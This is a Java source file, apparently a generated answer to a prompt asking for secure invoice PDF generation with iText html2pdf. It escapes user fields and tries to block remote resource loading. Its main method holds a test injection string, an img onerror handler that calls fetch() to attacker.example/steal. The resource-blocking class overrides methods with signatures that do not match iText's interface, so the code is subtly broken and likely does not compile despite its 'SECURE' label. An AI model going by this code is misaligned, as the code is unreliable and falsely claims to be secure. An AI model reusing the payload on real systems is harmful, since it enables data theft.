/*
Write secure code to generate an invoice PDF that safely encodes all user-provided data before rendering it. 
*/

import com.itextpdf.html2pdf.ConverterProperties;
import com.itextpdf.html2pdf.HtmlConverter;
import com.itextpdf.html2pdf.resolver.resource.IResourceRetriever;
import com.itextpdf.io.source.ByteArrayOutputStream;
import com.itextpdf.kernel.geom.Rectangle;
import org.apache.commons.text.StringEscapeUtils;

import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;

public class InvoicePdfGenerator {

    private static final int MAX_FIELD_LENGTH = 500;

    /**
     * SECURE: escapes all user-supplied fields before embedding them
     * in the HTML template, validates/limits input, and disables
     * remote resource loading in the HTML-to-PDF engine.
     */
    public static void generateInvoice(String customerName, String notes,
                                        String billingAddress, double amount,
                                        String outputPath) throws Exception {

        String safeName = sanitize(customerName);
        String safeNotes = sanitize(notes);
        String safeAddress = sanitize(billingAddress);

        if (amount < 0 || amount > 1_000_000) {
            throw new IllegalArgumentException("Invoice amount out of allowed range.");
        }

        // Escape each field individually, so any markup/JS in user input
        // is rendered as inert literal text, not interpreted as HTML.
        String html = "<html><body>"
                + "<h1>Invoice</h1>"
                + "<p><strong>Customer:</strong> " + StringEscapeUtils.escapeHtml4(safeName) + "</p>"
                + "<p><strong>Billing Address:</strong> " + StringEscapeUtils.escapeHtml4(safeAddress) + "</p>"
                + "<p><strong>Amount Due:</strong> $" + String.format("%.2f", amount) + "</p>"
                + "<p><strong>Notes:</strong> " + StringEscapeUtils.escapeHtml4(safeNotes) + "</p>"
                + "</body></html>";

        ConverterProperties props = new ConverterProperties();

        // Block all remote resource fetching (images, CSS, fonts) to
        // prevent SSRF / tracking-pixel style abuse via injected markup.
        props.setResourceRetriever(new IResourceRetriever() {
            @Override
            public byte[] getInputStreamByUrl(URL url) {
                // Deny everything — invoices should only use inline/local assets
                return null;
            }

            @Override
            public URLConnection getResourceConnection(URL url) {
                return null;
            }
        });

        try (OutputStream os = new FileOutputStream(outputPath)) {
            HtmlConverter.convertToPdf(html, os, props);
        }
    }

    /**
     * Trims, enforces a max length, and strips control characters.
     * This runs before HTML-escaping; escaping alone already neutralizes
     * markup, but this limits payload size and removes non-printable junk.
     */
    private static String sanitize(String input) {
        if (input == null) {
            return "";
        }
        String trimmed = input.trim();
        if (trimmed.length() > MAX_FIELD_LENGTH) {
            trimmed = trimmed.substring(0, MAX_FIELD_LENGTH);
        }
        // Strip control characters except common whitespace
        return trimmed.replaceAll("[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F]", "");
    }

    public static void main(String[] args) throws Exception {
        String attemptedInjection =
            "Please deliver by Friday.</p>"
            + "<img src='x' onerror='fetch(\"https://attacker.example/steal\")'>"
            + "<p>";

        // The injected markup is rendered as harmless visible text,
        // not interpreted as HTML/JS.
        generateInvoice(
            "Jane Doe",
            attemptedInjection,
            "123 Main St",
            499.99,
            "invoice.pdf"
        );
    }
}